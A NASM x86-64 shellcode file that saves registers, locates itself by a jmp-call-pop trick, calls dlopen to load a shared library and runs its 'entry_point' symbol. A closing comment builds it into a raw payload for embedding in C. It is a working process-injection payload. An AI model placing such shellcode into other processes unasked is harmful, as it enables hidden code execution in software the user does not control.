BITS 64

global _start

_start:
    push rax ;[rsp+120] ; empty
    push rbp ;[rsp+112]
    push r8  ;[rsp+104]
    push r9  ;[rsp+96]
    push r10 ;[rsp+88]
    push r11 ;[rsp+80]
    push r12 ;[rsp+72]
    push r13 ;[rsp+64]
    push r14 ;[rsp+56]
    push r15 ;[rsp+48]
    push rax ;[rsp+40]
    push rbx ;[rsp+32]
    push rcx ;[rsp+24]
    push rdx ;[rsp+16]
    push rsi ;[rsp+8]
    push rdi ;[rsp]
    jmp short _trick
    ;jmp short _restore

_code:
    xor rax, rax
    xor rdi, rdi
    xor rdx, rdx
    pop rbx;

_dlopen:
    mov rdi, rbx
    add rdi, 24                    ; rdi = *(msg)
    xor rsi, rsi
    inc rsi
    mov rbp, rsp
    sub rbp, 0x1000
    mov rcx, [rbx]
    call rcx
    test rax, rax
    je _restore

_next:
    call _dlsym

_symbol:
    db "entry_point", 0x0

_dlsym:
    pop rsi
    mov rdi, rax
    mov rcx, rbx
    add rcx, 8
    mov rcx, [rcx]
    call rcx
    test rax, rax
    je _restore
    mov rdi, [rsp] ; current rdi <- stack rdi
    call rax

_restore:
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    add rsp, 8

_ret:
    ret

_trick:
    call _code

; name="shellcode64"; nasm $name.s -o $name.payload; nasm -f elf64 $name.s -o $name.o; ld $name.o -o $name; hexdump -C $name.payload; echo -e "\n\n"; ndisasm -b 64 $name.payload && ./bin_to_c.py $name.payload
